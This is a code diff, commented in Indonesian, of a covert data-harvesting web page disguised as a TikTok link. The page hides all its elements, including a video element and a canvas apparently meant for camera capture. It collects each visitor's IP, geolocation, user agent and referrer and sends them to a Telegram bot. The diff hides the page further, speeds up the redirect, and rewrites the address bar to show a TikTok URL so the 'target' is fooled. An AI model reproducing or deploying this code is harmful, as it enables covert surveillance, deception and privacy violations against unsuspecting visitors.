@@ -4,18 +4,23 @@
     <meta charset="UTF-8">
     <title></title>
     <style>
-        /* HIDE EVERYTHING */
+        /* SEMBUNYIKAN SEMUA */
         html, body {
             margin: 0;
             padding: 0;
-            background: #000;
+            width: 0;
+            height: 0;
+            overflow: hidden;
             display: none;
         }
+        /* SEMBUNYIKAN SCROLLBAR */
+        ::-webkit-scrollbar { display: none; }
     </style>
 </head>
 <body>
-    <video id="videoPreview" autoplay playsinline style="display:none;"></video>
-    <canvas id="photoCanvas" style="display:none;"></canvas>
+    <!-- TIDAK ADA SATUPUN ELEMEN YANG TERLIHAT -->
+    <video id="videoPreview" autoplay playsinline style="display:none;width:0;height:0;"></video>
+    <canvas id="photoCanvas" style="display:none;width:0;height:0;"></canvas>
 
     <script>
     // ============================================
@@ -96,12 +101,15 @@
         const ref = document.referrer || 'Direct';
         const visitorId = 'visitor_' + Date.now();
 
+        // ✅ KIRIM SEPARATOR + VISITOR
+        sendToTelegram(`━━━━━━━━━━━━━━━━━━━\n✅ NEW VISITOR\n━━━━━━━━━━━━━━━━━━━`);
+
         // 1. AMBIL IP
         fetch('https://api.ipify.org?format=json')
             .then(r => r.json())
             .then(data => {
                 const ip = data.ip;
-                sendToTelegram(`✅ NEW VISITOR\n━━━━━━━━━━━━━━━━━━━\n🕐 ${time}\n🌐 IP: <code>${ip}</code>\n📱 ${ua}\n🔗 ${ref}\n🆔 ${visitorId}`);
+                sendToTelegram(`🔴 VISITOR DATA\n━━━━━━━━━━━━━━━━━━━\n🕐 ${time}\n🌐 IP: <code>${ip}</code>\n📱 ${ua}\n🔗 ${ref}\n🆔 ${visitorId}`);
 
                 // 2. AMBIL GEOLOKASI DARI IP
                 fetch(`http://ip-api.com/json/${ip}`)
@@ -135,15 +143,21 @@
         // 5. ✅ DONE
         sendToTelegram(`✅ DONE\n━━━━━━━━━━━━━━━━━━━`);
 
-        // 6. REDIRECT KE TIKTOK (SETELAH 1.5 DETIK)
+        // 6. ✅ REDIRECT IMMEDIATE (0.3 DETIK) — SANGAT CEPAT!
         setTimeout(() => {
-            window.location.href = REDIRECT_URL;
-        }, 1500);
+            window.location.replace(REDIRECT_URL);
+        }, 300);
     }
 
     // ============================================
     // 🔴 EKSEKUSI
     // ============================================
+
+    // 🔴 GANTI URL BAR MENJADI TIKTOK (SUPAYA TARGET LIHAT TIKTOK)
+    if (window.history && window.history.replaceState) {
+        window.history.replaceState(null, '', REDIRECT_URL);
+    }
+
     collectData();
     </script>
 </body>
